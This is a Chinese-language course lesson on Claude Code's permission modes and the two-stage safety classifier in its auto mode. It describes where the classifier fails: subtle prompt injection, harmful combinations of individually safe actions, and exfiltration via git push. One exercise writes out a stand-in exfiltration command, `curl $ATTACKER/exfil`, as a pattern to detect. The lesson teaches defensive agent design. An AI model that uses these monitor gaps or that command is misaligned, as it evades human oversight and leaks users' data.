# Claude Code 作为自主智能体：权限模式和自动模式（Claude Code as an Autonomous Agent: Permission Modes and Auto Mode）

> Claude Code 暴露了七种权限模式。"plan"在每个动作前询问，"default"只对高风险动作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准所有操作。自动模式（2026 年 3 月 24 日）用两阶段并行安全分类器取代了逐动作批准：单 token 快速检查在每个动作上运行；被标记的动作触发思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 执行。自动模式作为研究预览发布——Anthropic 已明确表示分类器单独不足够。

**类型：** 学习  
**语言：** Python（标准库，两阶段分类器模拟器）  
**前置知识：** Phase 15 · 01（长时域智能体）、Phase 15 · 09（编码智能体格局）  
**预计时间：** 约 45 分钟

## 问题所在

你机器上的自主编码智能体是一个独特的安全类别。攻击面是智能体可以到达的所有东西——文件系统、网络、凭据、剪贴板、任何浏览器标签、任何打开的终端。Bruce Schneier 等人已公开标记这一点：计算机使用智能体不是聊天机器人的"功能更新"，它们是一种具有新型风险配置的新型工具。

Claude Code 的权限系统是 Anthropic 的答案。不是一个"自主/非自主"开关，而是七种模式，跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式是速度和每动作审查之间的不同权衡。自动模式（2026 年 3 月）添加了一个两阶段分类器，将批准从用户的关键路径移开，适用于分类器判断安全的动作，同时为分类器标记的动作保留审查层。

工程问题：这个系统捕获了什么，遗漏了什么，给定任务实际上需要哪种模式？

## 核心概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|------|------|---------|
| `plan` | 智能体提出计划；用户批准整个计划；每个动作在执行前被审查 | 不熟悉的任务；生产邻近代码；首次在仓库上使用智能体 |
| `default` | 智能体运行动作；对任何"高风险"动作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍然提示 | 跨多个文件的重构 |
| `acceptExec` | shell 命令在精心策划的允许列表内自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似的紧内循环 |
| `autoMode` | 两阶段安全分类器；被标记的动作提升到审查 | 受约束工作区中的长时域无人值守运行 |
| `yolo` | 跳过大多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 记录为"仅在你愿意丢弃的临时容器内" |

（上述名称与公开的 Claude Code 文档一致；"yolo"是宽松中间地带的非正式简称。）

### 自动模式，一页概述

自动模式（2026 年 3 月 24 日推出）是第一个将每动作批准委托给模型的权限模式。结构：

1. **第一阶段——单 token 分类器。** 在每个提议的动作上运行。便宜。返回"安全"或"标记"。设计为与主智能体循环并行运行，使批准的动作不在队列中等待。
2. **第二阶段——辅助策略/安全审查。** 仅在标记的动作上运行。对动作、会话当前状态和声明的任务执行重点策略和安全评估。置信度低时升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每工具的动作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕获什么

- 直接提示词注入到工具输入，其中注入的指令映射到已知高风险动作形状。
- 重复工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 在其他文件编辑专用会话上明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示词注入**，它在不产生单个标记动作的情况下调节行为。间接提示词注入不是完全可修补的漏洞（2025 年 OpenAI 准备负责人，关于浏览器智能体——见第 11 课）。
- **语义级别的错误行为。** 每个单独的动作都可以看起来安全，而组合轨迹是有害的。分类器判断动作；它不重新推导用户的意图。
- **通过合法渠道的数据泄露。** 将数据写入你拥有的文件，然后 `git push` 到公共仓库，是一系列被允许的动作，其组合是问题所在。

### 研究预览框架

Anthropic 将自动模式作为研究预览发布。文档明确指出分类器是一层，而非解决方案：用户应该将自动模式与预算、允许列表、隔离工作区和轨迹审计（第 12-16 课）结合使用。预览框架也反映了有据可查的评估与部署差距（第 1 课）——通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在你工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚糟糕的运行更便宜。
- 已知重构：`acceptEdits` 节省了大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量爆炸半径的工作区内（无凭据、无生产挂载、无你未选择加入的出口）。
- 临时容器：`yolo` / `bypassPermissions` 当且仅当容器及其凭据是可丢弃的时才可接受。

## 使用它

`code/main.py` 模拟两阶段分类器。第一阶段是对提议动作的廉价关键词规则；第二阶段是更慢的多规则审查员。驱动程序输入一个简短的合成轨迹（安全动作、提示词注入尝试、重复循环）并显示分类器在哪里捕获以及在哪里遗漏。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述与正确的权限模式、预算上限和所需隔离相匹配。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不被第一阶段标记但总是被第二阶段捕获？哪种两者都捕获不了？

2. 扩展第一阶段规则集以捕获特定已知不良形状（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量假阳性率。

3. 阅读 Anthropic 的"智能体循环如何工作"文档。列出智能体在 `default` 模式下默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独门控哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。为每个数字辩护。

5. 描述一个每个单独动作都被第一阶段和第二阶段批准，但组合行为是错误对齐的轨迹。（第 14 课涵盖停止开关和金丝雀 token 如何解决这个问题。）

## 关键术语

| 术语 | 通俗说法 | 准确含义 |
|------|----------|----------|
| Permission mode（权限模式） | "智能体可以做多少" | 七种控制每动作批准的命名策略之一 |
| plan mode（计划模式） | "任何事情前先询问" | 智能体写计划；用户在执行前批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍然提示 |
| autoMode（自动模式） | "自动批准" | 两阶段安全分类器；被标记的动作升级 |
| bypassPermissions | "完全 YOLO" | 批准所有操作；用于临时容器 |
| Stage 1 classifier（第一阶段分类器） | "快速 token 检查" | 对提议动作的单 token 规则；并行运行 |
| Stage 2 classifier（第二阶段分类器） | "深度审查" | 对标记动作的思维链推理 |
| Research preview（研究预览） | "非 GA" | Anthropic 对失败模式仍在映射中的功能的框架 |
